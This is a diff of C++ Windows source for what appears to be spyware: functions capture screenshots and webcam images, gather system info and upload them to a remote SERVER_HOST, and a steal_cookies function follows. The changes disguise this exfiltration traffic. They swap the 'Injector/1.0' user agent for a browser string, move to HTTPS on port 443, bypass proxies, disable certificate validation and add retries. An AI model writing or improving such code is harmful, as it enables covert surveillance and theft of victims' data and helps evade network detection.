@@ -414,16 +414,18 @@ void capture_screenshot()
 std::string fetch_token()
 {
     std::string token;
-    HINTERNET hSession = WinHttpOpen(L"Injector/1.0",
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
     if (!hSession) { diag_log("token: WinHttpOpen failed"); return token; }
 
-    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 8080, 0);
+    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 443, 0);
     if (!hConnect) { diag_log("token: WinHttpConnect failed"); WinHttpCloseHandle(hSession); return token; }
 
     HINTERNET hReq = WinHttpOpenRequest(hConnect, L"GET", L"/token",
-        nullptr, nullptr, nullptr, 0);
-    if (!hReq) { diag_log("token: WinHttpOpenRequest failed"); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return token; }
+        nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE);
+    if (!hReq) { return token; }
+    DWORD _sf1 = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &_sf1, sizeof(_sf1));
 
     BOOL ok = WinHttpSendRequest(hReq, nullptr, 0, nullptr, 0, 0, 0);
     if (!ok) { diag_log("token: SendRequest failed (no network?)"); WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return token; }
@@ -579,11 +581,11 @@ void upload_data()
             body2.insert(body2.end(), (BYTE*)end.c_str(), (BYTE*)end.c_str() + end.size());
         }
 
-        HINTERNET hSession = WinHttpOpen(L"Injector/1.0",
+        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
         if (!hSession) { diag_log("upload: WinHttpOpen fail"); Sleep(2000); continue; }
 
-        HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 8080, 0);
+        HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, 443, 0);
         if (!hConnect) { diag_log("upload: Connect fail"); WinHttpCloseHandle(hSession); Sleep(2000); continue; }
 
         // build URL with token as query param
@@ -591,7 +593,7 @@ void upload_data()
         std::wstring wurl(url.begin(), url.end());
 
         HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wurl.c_str(),
-            nullptr, nullptr, nullptr, 0);
+            nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE);
         if (hRequest) {
             // pass Content-Type in headers to SendRequest (more reliable)
             std::string ctHeader = "Content-Type: multipart/form-data; boundary="
@@ -1078,24 +1080,32 @@ void guarded_webcam()
 void simple_upload()
 {
     std::string token;
-    // fetch token via WinHTTP
-    HINTERNET hS = WinHttpOpen(L"I/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
-    if (!hS) return;
-    HINTERNET hC = WinHttpConnect(hS, SERVER_HOST, 8080, 0);
-    if (hC) {
-        HINTERNET hR = WinHttpOpenRequest(hC, L"GET", L"/token", nullptr, nullptr, nullptr, 0);
-        if (hR && WinHttpSendRequest(hR, nullptr, 0, nullptr, 0, 0, 0) && WinHttpReceiveResponse(hR, nullptr)) {
-            char b[256] = {};
-            DWORD r = 0;
-            WinHttpReadData(hR, b, 255, &r);
-            const char* p = strstr(b, "\"token\"");
-            if (p) { p = strchr(p, ':'); if (p) { p = strchr(p, '"'); if (p) { const char* q = strchr(p + 1, '"'); if (q) token.assign(p + 1, q); } } }
-            WinHttpCloseHandle(hR);
-        }
+
+    // fetch token with retry (CF edge node may be bad)
+    for (int attempt = 0; attempt < 3; attempt++) {
+        HINTERNET hS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
+        if (!hS) { Sleep(2000); continue; }
+        DWORD tlsOpt = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
+        WinHttpSetOption(hS, WINHTTP_OPTION_SECURE_PROTOCOLS, &tlsOpt, sizeof(tlsOpt));
+        HINTERNET hC = WinHttpConnect(hS, SERVER_HOST, 443, 0);
+        if (!hC) { WinHttpCloseHandle(hS); Sleep(2000); continue; }
+        HINTERNET hR = WinHttpOpenRequest(hC, L"GET", L"/token", nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE);
+        if (!hR) { WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); Sleep(2000); continue; }
+        DWORD _sf3 = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+        WinHttpSetOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &_sf3, sizeof(_sf3));
+        BOOL ok = WinHttpSendRequest(hR, nullptr, 0, nullptr, 0, 0, 0) && WinHttpReceiveResponse(hR, nullptr);
+        if (!ok) { WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); Sleep(2000); continue; }
+        char b[256] = {}; DWORD r = 0;
+        WinHttpReadData(hR, b, 255, &r);
+        const char* p = strstr(b, "\"token\"");
+        if (p) { p = strchr(p, ':'); if (p) { p = strchr(p, '"'); if (p) { const char* q = strchr(p + 1, '"'); if (q) token.assign(p + 1, q); } } }
+        WinHttpCloseHandle(hR);
         WinHttpCloseHandle(hC);
+        WinHttpCloseHandle(hS);
+        if (!token.empty()) break;
+        Sleep(2000);
     }
-    WinHttpCloseHandle(hS);
-    if (token.empty()) return;
+    if (token.empty()) { MessageBoxW(nullptr, L"token failed after 3 retries", L"UP ERR", MB_OK); return; }
 
     // build paths
     wchar_t scrPath[MAX_PATH], camPath[MAX_PATH], infoPath[MAX_PATH];
@@ -1165,24 +1175,28 @@ void simple_upload()
     // POST via WinHTTP
     std::string url = "/upload?token=" + token;
     std::wstring wu(url.begin(), url.end());
-    hS = WinHttpOpen(L"I/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
-    if (!hS) return;
-    hC = WinHttpConnect(hS, SERVER_HOST, 8080, 0);
-    if (hC) {
-        HINTERNET hR = WinHttpOpenRequest(hC, L"POST", wu.c_str(), nullptr, nullptr, nullptr, 0);
-        if (hR) {
+    HINTERNET _hS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_NO_PROXY, nullptr, nullptr, 0);
+    if (!_hS) return;
+    DWORD tlsOpt2 = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
+    WinHttpSetOption(_hS, WINHTTP_OPTION_SECURE_PROTOCOLS, &tlsOpt2, sizeof(tlsOpt2));
+    HINTERNET _hC = WinHttpConnect(_hS, SERVER_HOST, 443, 0);
+    if (_hC) {
+        HINTERNET _hR = WinHttpOpenRequest(_hC, L"POST", wu.c_str(), nullptr, nullptr, nullptr, WINHTTP_FLAG_SECURE);
+        if (_hR) {
+            DWORD _sf4 = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+            WinHttpSetOption(_hR, WINHTTP_OPTION_SECURITY_FLAGS, &_sf4, sizeof(_sf4));
             std::string ct = "Content-Type: multipart/form-data; boundary=" + std::string(B) + "\r\n";
             std::wstring wc(ct.begin(), ct.end());
-            if (WinHttpSendRequest(hR, wc.c_str(), (DWORD)wc.size(), nullptr, 0, (DWORD)body.size(), 0)) {
+            if (WinHttpSendRequest(_hR, wc.c_str(), (DWORD)wc.size(), nullptr, 0, (DWORD)body.size(), 0)) {
                 DWORD wr;
-                WinHttpWriteData(hR, body.data(), (DWORD)body.size(), &wr);
-                WinHttpReceiveResponse(hR, nullptr);
+                WinHttpWriteData(_hR, body.data(), (DWORD)body.size(), &wr);
+                WinHttpReceiveResponse(_hR, nullptr);
             }
-            WinHttpCloseHandle(hR);
+            WinHttpCloseHandle(_hR);
         }
-        WinHttpCloseHandle(hC);
+        WinHttpCloseHandle(_hC);
     }
-    WinHttpCloseHandle(hS);
+    WinHttpCloseHandle(_hS);
 }
 
 void steal_cookies()
